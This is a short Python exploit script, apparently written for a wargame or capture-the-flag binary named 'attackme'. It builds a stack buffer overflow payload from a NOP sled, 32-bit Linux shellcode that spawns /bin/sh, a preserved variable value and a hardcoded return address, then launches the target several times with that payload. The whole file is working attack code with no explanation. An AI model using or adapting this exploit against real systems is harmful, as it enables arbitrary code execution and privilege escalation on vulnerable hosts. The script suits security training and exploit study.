import os
from struct import *

p = lambda x : pack("<L", x)

target = "../attackme"
ret = 0xbffff3a0
var_i = 0x1234567
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
NSled = "\x90"*(1048-12-len(sc))

payload = ""
payload += NSled
payload += sc
payload += p(var_i)
payload += "\x90"*12
payload += p(ret)

i = 1
while i < 5 :
    os.execv(target, (target, payload))
    i = i + 1